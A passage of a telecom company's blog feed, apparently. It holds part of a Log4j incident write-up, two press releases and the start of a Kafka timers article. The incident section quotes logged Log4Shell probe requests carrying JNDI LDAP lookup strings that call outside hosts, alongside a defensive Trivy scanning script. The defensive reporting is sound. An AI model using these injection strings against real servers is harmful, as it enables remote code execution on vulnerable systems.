style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">1389</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Exploit}</span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"7c9223d6-2c81-491d-8564-10742cc90a9c"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"54.75.196.220"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"-"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In our Tokyo region, we started to see a lot of requests from <code>x00.it</code> domain.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">14</span><span class="token plain">/Dec/2021:17:37:59 +0000</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_id.log4jdns.x00.it%2F%7D&amp;page=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_page.log4jdns.x00.it%2F%7D&amp;search=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_search.log4jdns.x00.it%2F%7D HTTP/1.1"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">401</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">39</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">divd-0c1679670abeeb68eeabd98981713eea_${date</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">YYYYMMddHHmmss}</span><span class="token string" style="color:rgb(195, 232, 141)">_https_Referer.log4jdns.x00.it/}"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">divd-0c1679670abeeb68eeabd98981713eea_${date</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">YYYYMMddHHmmss}</span><span class="token string" style="color:rgb(195, 232, 141)">_https_User-Agent.log4jdns.x00.it/}"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">4496</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.255</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">monitoring-mki-lab-grafana-80</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100.115</span><span class="token plain">.164.63:3000 </span><span class="token number" style="color:rgb(247, 140, 108)">39</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.001</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">401</span><span class="token plain"> d7fa702ee8cc73793707ca6720c57639 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">194.5</span><span class="token plain">.73.6</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In the coming weeks we will continue to monitor the probes across our public infrastructure to see how they evolve.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="monday">Monday<a class="hash-link" href="#monday" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="docker-vulnerability-scans">Docker Vulnerability Scans<a class="hash-link" href="#docker-vulnerability-scans" title="Direct link to heading">​</a></h3><p>Next, we wanted to ensure there was not an application running in our Kubernetes clusters with a vulnerable version of Log4j. We know from <a href="https://github.com/cisagov/log4j-affected-db" target="_blank" rel="noopener noreferrer">this resource</a> that there are many open source applications that are vulnerable. To ensure we are not running a tool that is vulnerable, we used Kubernetes API with <a href="https://github.com/kubernetes/kubectl" target="_blank" rel="noopener noreferrer">kubectl</a> and <a href="https://github.com/aquasecurity/trivy" target="_blank" rel="noopener noreferrer">Trivy</a>, a scanner for vulnerabilities in container images.</p><p>First, we built a small POC to ensure that Trivy can identify the CVE-2021-44228.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">❯❯❯ brew </span><span class="token function" style="color:rgb(130, 170, 255)">install</span><span class="token plain"> aquasecurity/trivy/trivy</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">❯❯❯ trivy image birdyman/log4j2-demo:1.0.0-12 </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">grep</span><span class="token plain"> CVE-2021-44228</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> org.apache.logging.log4j:log4j-api                     </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> CVE-2021-44228   </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> CRITICAL </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2.10</span><span class="token plain">.0            </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2.15</span><span class="token plain">.0                         </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> Remote code injection </span><span class="token keyword" style="font-style:italic">in</span><span class="token plain"> Log4j                                                  </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now that we know Trivy works, let’s create a small bash script to call Kubectl and Trivy and grep for the Log4j CVE.</p><p><code>trivy-scan-cve.sh CVE-2021-44228</code></p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token shebang important">#!/usr/bin/env bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">VULN</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"Scanning </span><span class="token string variable" style="color:rgb(191, 199, 213)">$1</span><span class="token string" style="color:rgb(195, 232, 141)">..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">imgs</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token variable" style="color:rgb(191, 199, 213)">kubectl get pods -A -o </span><span class="token variable assign-left variable" style="color:rgb(191, 199, 213)">jsonpath</span><span class="token variable operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable string" style="color:rgb(195, 232, 141)">'{range .items[*]}{.spec.containers[*].image}{" "}'</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable operator" style="color:rgb(137, 221, 255)">|</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable function" style="color:rgb(130, 170, 255)">tr</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable string" style="color:rgb(195, 232, 141)">" "</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable string" style="color:rgb(195, 232, 141)">"</span><span class="token variable string entity" style="color:rgb(195, 232, 141)">\n</span><span class="token variable string" style="color:rgb(195, 232, 141)">"</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable operator" style="color:rgb(137, 221, 255)">|</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable function" style="color:rgb(130, 170, 255)">sort</span><span class="token variable" style="color:rgb(191, 199, 213)"> -u</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:rgb(191, 199, 213)">img</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">in</span><span class="token plain"> </span><span class="token variable" style="color:rgb(191, 199, 213)">${imgs}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"scanning </span><span class="token string variable" style="color:rgb(191, 199, 213)">${img}</span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">result</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token variable" style="color:rgb(191, 199, 213)">trivy image --severity CRITICAL $</span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token variable" style="color:rgb(191, 199, 213)">img</span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">if</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token variable" style="color:rgb(191, 199, 213)">${result}</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">grep</span><span class="token plain"> -q </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">$1</span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> -e </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${img}</span><span class="token string" style="color:rgb(195, 232, 141)"> is vulnerable, please patch!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We ran the above script across all of our Kubernetes clusters. This was helpful as we then found some additional test services which included the vulnerable Log4j library. These vulnerable services were based on 3rd party open-source applications, therefore we were not able to identify them earlier when looking just through the code dependencies. We took the necessary actions to remediate these services and investigate that there was no malicious traffic from these pods.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="monitoring-vendors">Monitoring Vendors<a class="hash-link" href="#monitoring-vendors" title="Direct link to heading">​</a></h3><p>It is important to note that because we operate in the cloud and also use some vendor components in our mobile core network, we needed to ensure these core components were not affected by Log4j vulnerabilities. In our case, we followed the AWS and Cisco Security Bulletins and update our components when required.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-worked-well-and-could-be-improved">What worked well and could be improved<a class="hash-link" href="#what-worked-well-and-could-be-improved" title="Direct link to heading">​</a></h2><p>During this incident management we have gathered great learnings in the way.</p><p>First of all, our GitOps and centralized software repositories have been critical to remediate very quickly to the vulnerability, enabling us to quickly deploy across our entire infrastructure new components, without interrupting operations or losing any log information in the process.</p><p>Second, while our monorepo and automated scan helped us a lot to identify vulnerable components, they still depend on the availability of up-to-date information. During that incident, we noticed that it was often difficult to rely on those 3rd party components to address a 0day risk. Therefore, we will rely on improving our defense-in-depth by verifying that unnecessary code execution is systematically disabled in our runtimes, improve the sanity of our container images by adopting best practices of the cloud industry.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="staying-secure">Staying secure<a class="hash-link" href="#staying-secure" title="Direct link to heading">​</a></h2><p>All in all, it is important that we have the ability to plan, identify, contain and prevent zero-day vulnerabilities such as Log4j. We only spoke about some of the controls we have in place, but we are continuing to explore new technologies and mechanisms to ensure we build and maintain a secure environment.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="we-are-hiring">We are hiring<a class="hash-link" href="#we-are-hiring" title="Direct link to heading">​</a></h2><p>If you are a Security Engineer looking for a new challenge to make a secure mobile core platform, come and say hi. <a href="/jp/careers/">www.wgtwo.com/careers</a></p>]]></content:encoded>
            <category>security</category>
            <category>infrastructure</category>
            <category>vulnerability</category>
        </item>
        <item>
            <title><![CDATA[CKH IOD selects Working Group Two for public cloud core network]]></title>
            <link>https://www.wgtwo.com/jp/blog/ckh-iod-wg2-public-cloud</link>
            <guid>ckh-iod-wg2-public-cloud</guid>
            <pubDate>Wed, 01 Dec 2021 12:00:00 GMT</pubDate>
            <description><![CDATA[CKH IOD migrates its core network to the cloud – delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS]]></description>
            <content:encoded><![CDATA[<img loading="lazy" src="/img/ckh.png" alt="ckh" width="300" class="img_ev3q"><ul><li>As an industry-first, CKH IOD migrates its core network to the cloud – delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS</li><li>A cloud-based core network brings radical simplification, cost efficiency and a platform to leverage a developer community – to drive innovation and capitalize on disruptive technologies</li></ul><p><strong>Oslo/London, 1 December, 2021</strong> – CKH Innovations Opportunities Development (CKH IOD) has entered into a contract with Working Group Two to move its core network to the public cloud. CKH IOD, a telecoms unit and international development hub of CK Hutchison, via a fully managed SaaS by Working Group Two, will deploy its mobile core network on Amazon Web Services (AWS). The agreement means that CKH IOD, and its MVNO, IoT and Private Network customers, can achieve radical simplification, speed up innovation, explore new revenue streams and get to market faster.</p><p>CKH IOD will leverage Working Group Two’s platform to deliver services across the CK Hutchison telecoms footprint in Europe, Asia and its wider international partners.</p><p>By evolving to a software-defined network, CKH IOD radically consolidates its vendor relationships and associated complexities. Working Group Two’s fully managed mobile core network also automates operations and maintenance to deliver a more cost-efficient service.</p><p>“Our collaboration with Working Group Two to deploy our core network on the public cloud delivers simplicity, improved operational efficiency and the ability to quickly develop new initiatives to meet market needs, with particular focus on the MVNO, IoT and Private Network space. It’s about achieving scale and the highest levels of security while reducing complexity – to the benefit of our customers and ultimately, end-users in our markets,” says Joe Parker, CEO of CKH IOD.</p><p>“CKH IOD earns a first-mover advantage by deploying a core built leveraging the webscale playbook. Being built on the cloud and delivered as-a-service, this core enables simplicity, cost efficiency and a continuous evolution of capabilities and features – with no end-of-life. In addition, they get access to a community of partners that build and integrate into the cloud core, giving a vastly enhanced pace of innovation. Under the umbrella of “everything as-a-service” the time has come to include the core network. We are incredibly excited to announce this landmark agreement,” says Erlend Prestgard, CEO of Working Group Two.</p><p>Working Group Two leverages the proven infrastructure and breadth of services from AWS to deploy a cloud-native core network.</p><p>“Working Group Two is a pioneer in building mobile core networks with much of the same philosophy that AWS builds infrastructure. Scalable, secure, consistent and API-driven, delivering the promise of efficiency and rapid innovation at scale,” says David Brown, VP and GM of Amazon EC2.</p><p>“With CKH IOD deciding to host its core network on the public cloud and have it fully managed by a third party under a managed SaaS model, we are witnessing a significant technology shift. By opting for a full set of capabilities from AWS, CKH IOD and Working Group Two can leverage the full benefits of the public cloud, including opening up for new business models. This will allow CKH IOD to scale their services and offerings with superior visibility and control. They will be stimulating a rapid pace of innovation with the highest levels of security and performance,” says Fabio Cerone, Managing Director EMEA, Telco Business Unit at AWS.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="about-ckh-innovations-opportunities-development">About CKH Innovations Opportunities Development<a class="hash-link" href="#about-ckh-innovations-opportunities-development" title="Direct link to heading">​</a></h3><p>CKH Innovations Opportunities Development is a telecom unit and international development hub of CK Hutchison, creating international and global technological innovations that are built on one of CK Hutchison’s strongest assets, our mobile networks. We offer customised global mobile communications and data solutions that create new digital value and unprecedented opportunities for business. Our collaborative approach combined with our world-class network and experience means we are best placed to help our customers design, adapt, develop and scale solutions faster. Read more at <a href="https://www.ckhiod.com" target="_blank" rel="noopener noreferrer">https://www.ckhiod.com</a></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="about-working-group-two">About Working Group Two<a class="hash-link" href="#about-working-group-two" title="Direct link to heading">​</a></h3><p>Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency – leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at <a href="https://wgtwo.com" target="_blank" rel="noopener noreferrer">https://wgtwo.com</a></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="for-more-information">For more information<a class="hash-link" href="#for-more-information" title="Direct link to heading">​</a></h3><p>Erlend Prestgard, CEO, Working Group Two, +47 4542 9555, <a href="mailto:erlend@wgtwo.com" target="_blank" rel="noopener noreferrer">erlend@wgtwo.com</a></p>]]></content:encoded>
            <category>press release</category>
            <category>telco</category>
        </item>
        <item>
            <title><![CDATA[Mitsui Knowledge Industry (MKI) to develop private networks business]]></title>
            <link>https://www.wgtwo.com/jp/blog/mitsui-knowledge-industry-mki-private-networks-business</link>
            <guid>mitsui-knowledge-industry-mki-private-networks-business</guid>
            <pubDate>Tue, 01 Jun 2021 12:00:00 GMT</pubDate>
            <description><![CDATA[Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS]]></description>
            <content:encoded><![CDATA[<img loading="lazy" src="/img/mki.png" alt="mki" width="300" class="img_ev3q"><p>— Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS —</p><p>CEO Erlend Prestgard of Working Group Two As, Oslo, Norway and President Kengo Asano of Mitsui Knowledge Industry Co., Ltd. Minato-ku, Japan, agreed on an MoU on providing WG2’s fully-managed Mobile Core NW SaaS product to accelerate the Private Networks business in the Japanese market.</p><p>In the Japanese market, there is a clear interest in Private NWs due to the regulatory setup of Private LTE and Local 5G. However, there are complex issues to overcome and Private NWs require professional knowledge to acquire a radio license, to design and operate the Core Network, and to optimize the Radio Network, all with reasonable cost. The MKI-WG2 agreement solves these problems:</p><ul><li>One-stop solution from client’s radio license acquisition to operational support</li><li>WG2’s Mobile Core NW built with a web-scale IT approach to simplify financial and operational aspects of the mobile system</li><li>Parties will encourage and enable the Private NW operators to create new business</li><li>MKI will provide WG2’s Mobile Core SaaS as part of its offering as well as reselling it to other integrators to create a larger ecosystem</li><li>MKI has radio network knowledge, and WG2 provides Mobile Core as a service (SaaS) that radically improves the cost model. With this partnership, both parties will combine those strengths and lift the Private NWs business to the next level.</li></ul><blockquote><p>“Together with MKI, we make the journey of launching feature-rich private networks simple and affordable. MKI’s strong local presence and Working Group Two’s ability to distill complex core networks into simple-to-use APIs allow customers to launch full-service mobile networks at a small scale – with market-leading affordability,” said Erlend Prestgard, CEO and Co-Founder of Working Group Two.</p></blockquote><h2 class="anchor anchorWithStickyNavbar_LWe7" id="about-working-group-two-wgtwo">About Working Group Two (wgtwo)<a class="hash-link" href="#about-working-group-two-wgtwo" title="Direct link to heading">​</a></h2><p>WG2 has rebuilt the mobile core for simplicity, innovation, and efficiency – leveraging the web-scale playbook and operating models. Today, WG2’s innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all G’s.</p><p>Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services.</p><p>WG2 is an Advanced Technology Partner of AWS: <a href="https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As" target="_blank" rel="noopener noreferrer">https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As</a></p><p>WG2 Website: <a href="https://wgtwo.com" target="_blank" rel="noopener noreferrer">https://wgtwo.com</a></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="about-mitsui-knowledge-industry-mki">About Mitsui Knowledge Industry (MKI)<a class="hash-link" href="#about-mitsui-knowledge-industry-mki" title="Direct link to heading">​</a></h3><p>Under the slogan “Unite Knowledge, Ignite the Future”, Mitsui Knowledge Industry Co., Ltd. (MKI)  has been creating IT strategies and supporting the digital transformation of its clients as their strategic business partner specializing mainly in information and communication technology. By utilizing its wealth of “KNOWLEDGE” accumulated through its long experience in technological development and innovation continuing for over half a century, MKI remains consistent in its pursuit to live up to the high expectations of its customers as their most reliable “value creator”.</p><p>MKI Website: <a href="https://www.mki.co.jp/english/about/" target="_blank" rel="noopener noreferrer">https://www.mki.co.jp/english/about/</a></p><p>Published: June 1, 2021</p>]]></content:encoded>
            <category>press release</category>
            <category>mki</category>
            <category>private networks</category>
        </item>
        <item>
            <title><![CDATA[Kafka timers]]></title>
            <link>https://www.wgtwo.com/jp/blog/kafka-timers</link>
            <guid>kafka-timers</guid>
            <pubDate>Sun, 28 Feb 2021 00:00:00 GMT</pubDate>
            <description><![CDATA[A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations]]></description>
            <content:encoded><![CDATA[<p>A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations
that provide a timer facility. Most of them are in memory and will lose scheduled timers should the application crash.
In this blog we discuss durable Kafka timers that do not depend on in memory state. By design
we shall assume 1 second resolution of these timers.</p><p>Before taking on timers let's cover some Kafka basics.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="kafka-concepts">Kafka concepts<a class="hash-link" href="#kafka-concepts" title="Direct link to heading">​</a></h2><p>There are a few Kafka concepts in play to simulate timers - Kafka topic, Kafka stream, Kafka streams library.
Where <em>topic</em> is append only log of events, <em>stream</em> is a cache of N most recent events on the <em>topic</em>,
and the <em>streams library</em> is a software library implementing the concept of the <em>stream</em>.</p><p>A kafka topic resides inside the Kafka servers, but Kafka streams library keeps track of a topic's most recent
events on the application side - the stream. The stream is a key/value cache with random read access unlike
append only topic log. Key/value cache is not the only thing the library provides. It can also join
the streams. When an event and its key appear on a stream, the library looks up the same key in the other streams participating in the join.
It is using key/value cache associated with each stream and gives the result to the application.
The result will have the present event enriched with the matched past events from the joined streams.
Joining two streams will yield the timer callback. Let's see how.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="implementation">Implementation<a class="hash-link" href="#implementation" title="Direct link to heading">​</a></h2><p>Since it is Kafka, timer expiration shall result in an event posted on a topic of user's choice at the right time.
This event is delayed until due time by joining two streams: <em>oscillator</em> and <em>timer-request</em>. Callback
event is pushed to <em>timer-request</em> topic with key equal to the expiration timestamp. Oscillator topic
is the clock dial counting seconds since UNIX epoch in real time. At some point it will get to the second
which is equal to the key on <em>timer-request</em> topic, and the join will come up with the callback event.</p><p>An excellent summary on "timer wheel" and other timer algorithms can be found in this linux kernel <a href="https://lwn.net/Articles/156329/" target="_blank" rel="noopener noreferrer">thread</a>.
Our implementation of timers using Kafka resembles the "timer wheel" algorithm with a bucket on each second to keep callbacks.
<em>Oscillator</em> topic models rotating clock dial, <em>timer-request</em> is bucketing callbacks by the expiration timestamp, and join of these two
contains content of the expired bucket with all the callbacks in it.</p><p><img loading="lazy" src="/jp/assets/images/kt-d3c8c75ee99a5f0c4b9fc155ad9418ea.png" width="1024" height="492" class="img_ev3q"></p><p>There are two Kafka applications running together to service these topics:</p><ul><li>Oscillator</li><li>Futures</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="oscillator">Oscillator<a class="hash-link" href="#oscillator" title="Direct link to heading">​</a></h3><p>With the resolution of 1 second oscillator keeps pushing <em>oscillator</em> topic:</p><div class="language-kotlin codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-kotlin codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">while (running) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val nowSeconds = System.currentTimeMillis() / 1000L</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    while (timestampSeconds &lt; nowSeconds) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        timestampSeconds++</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        KafkaProducers.send(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            "oscillator",</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            timestampSeconds.toString(),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            "1"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span 